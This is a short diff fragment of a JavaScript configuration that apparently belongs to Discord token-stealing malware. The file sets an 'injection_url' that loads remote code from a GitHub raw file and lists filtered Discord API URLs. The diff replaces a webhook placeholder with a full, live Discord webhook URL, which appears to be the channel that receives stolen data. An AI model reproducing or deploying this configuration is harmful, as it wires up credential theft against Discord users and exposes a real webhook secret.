@@ -16,7 +16,7 @@ var config = {
     "embed-color": 374276,
 
     injection_url: "https://raw.githubusercontent.com/ingramali/fokol/main/index.js",
-    webhook: "%WEBHOOK%",
+    webhook: "https://discordapp.com/api/webhooks/1083238578529767425/7eXjYFbzGD6tuT-2G8r8tVr74rPyIKBB1ymB5fyq90DhwFUVZZw6B0hSg0VF9tB4R3gg",
    Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
